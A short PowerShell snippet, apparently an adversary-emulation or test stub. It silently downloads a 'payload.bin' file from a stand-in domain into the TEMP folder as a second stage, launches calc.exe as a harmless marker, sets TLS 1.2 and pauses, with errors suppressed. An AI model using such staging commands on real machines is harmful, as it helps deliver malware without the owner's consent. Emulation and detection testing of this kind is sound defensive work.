Start-BitsTransfer -Source "http://adatum.com/downloads/payload.bin" -Destination "$env:TEMP\stage2.bin" -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Start-Sleep -Seconds 29
